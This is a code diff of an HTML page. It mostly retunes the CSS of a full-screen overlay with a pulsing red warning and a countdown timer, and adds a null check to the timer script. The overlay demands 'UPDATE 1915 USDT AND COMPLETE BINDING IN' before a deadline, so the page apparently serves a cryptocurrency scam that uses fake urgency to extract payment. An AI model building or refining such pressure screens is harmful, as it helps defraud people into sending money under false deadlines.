@@ -12,9 +12,9 @@
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      background: rgba(5, 10, 30, 0.88);
-      backdrop-filter: blur(26px) saturate(200%);
-      -webkit-backdrop-filter: blur(26px) saturate(200%);
+      background: rgba(5, 10, 30, 0.90);
+      backdrop-filter: blur(28px) saturate(210%);
+      -webkit-backdrop-filter: blur(28px) saturate(210%);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -23,60 +23,66 @@
     }
 
     .timer-box {
-      background: rgba(15, 25, 85, 0.82);
-      backdrop-filter: blur(35px);
-      -webkit-backdrop-filter: blur(35px);
-      border: 4px solid rgba(255, 70, 70, 0.9);
-      border-radius: 36px;
-      padding: 40px 34px;
+      background: rgba(15, 25, 90, 0.85);
+      backdrop-filter: blur(38px);
+      -webkit-backdrop-filter: blur(38px);
+      border: 5px solid rgba(255, 70, 70, 1);
+      border-radius: 38px;
+      padding: 44px 36px;
       text-align: center;
-      width: 90%;
-      max-width: 500px;
+      width: 92%;
+      max-width: 520px;
       box-shadow: 
-        0 0 50px rgba(255, 0, 0, 0.6),
-        inset 0 0 60px rgba(255, 100, 100, 0.25),
-        0 0 30px rgba(255, 70, 70, 0.4);
+        0 0 60px rgba(255, 0, 0, 0.7),
+        inset 0 0 70px rgba(255, 100, 100, 0.3),
+        0 0 40px rgba(255, 70, 70, 0.6);
       animation: float 3s ease-in-out infinite;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
     }
 
     @keyframes float {
       0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-18px); }
+      50% { transform: translateY(-20px); }
     }
 
     .warning-text {
       color: #ff3333;
       font-weight: 900;
-      font-size: 20px;
-      margin-bottom: 22px;
+      font-size: 21px;
+      margin-bottom: 24px;
       text-transform: uppercase;
-      letter-spacing: 2px;
-      line-height: 1.6;
-      word-wrap: break-word;
+      letter-spacing: 2.2px;
+      line-height: 1.4;
+      word-break: break-word;
+      white-space: normal;
       max-width: 100%;
-      text-shadow: 0 0 18px rgba(255, 51, 51, 1);
+      text-shadow: 0 0 20px rgba(255, 51, 51, 1);
       animation: pulse-red 1s infinite;
+      padding: 0 10px;
     }
 
     @keyframes pulse-red {
       0%, 100% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.07); opacity: 0.9; }
+      50% { transform: scale(1.08); opacity: 0.88; }
     }
 
     .timer-display {
       font-family: 'Cinzel', serif;
-      font-size: 52px;
+      font-size: 54px;
       font-weight: 700;
       color: #ffca28;
-      letter-spacing: 7px;
-      text-shadow: 0 0 22px rgba(255, 202, 40, 0.9);
+      letter-spacing: 8px;
+      text-shadow: 0 0 24px rgba(255, 202, 40, 1);
       text-transform: uppercase;
+      margin: 0;
     }
   </style>
 </head>
 <body>
 
-  <!-- TIMER OVERLAY -->
   <div class="timer-overlay" id="timerOverlay">
     <div class="timer-box">
       <div class="warning-text">UPDATE 1915 USDT AND COMPLETE BINDING IN</div>
@@ -115,7 +121,8 @@
       const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
       const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
       const s = String(totalSeconds % 60).padStart(2, '0');
-      document.getElementById('countdownTimer').textContent = `${h}:${m}:${s}`;
+      const el = document.getElementById('countdownTimer');
+      if (el) el.textContent = `${h}:${m}:${s}`;
     }
 
     window.addEventListener('load', () => {
